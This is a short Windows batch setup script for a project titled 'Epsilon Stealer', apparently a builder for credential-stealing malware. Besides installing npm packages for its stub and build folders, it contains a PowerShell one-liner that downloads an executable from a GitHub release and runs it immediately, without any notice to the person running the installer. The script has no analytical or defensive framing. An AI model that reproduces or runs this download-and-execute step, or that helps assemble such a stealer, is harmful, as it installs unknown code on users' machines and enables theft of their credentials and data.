@echo off

title Epsilon Stealer
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/IWcommunityFR
echo.





cd icon
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Epsilon-Stealer/releases/download/epsilon/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..

set "CURRENT_DIR=%CD%"
cd /d "%CURRENT_DIR%\stub"
ECHO.
ECHO Make sure you install Node.js with chocolatey or run the install file again.
ECHO.
call npm i

cd /d "%CURRENT_DIR%\build"
call npm install pkg --g
npm i
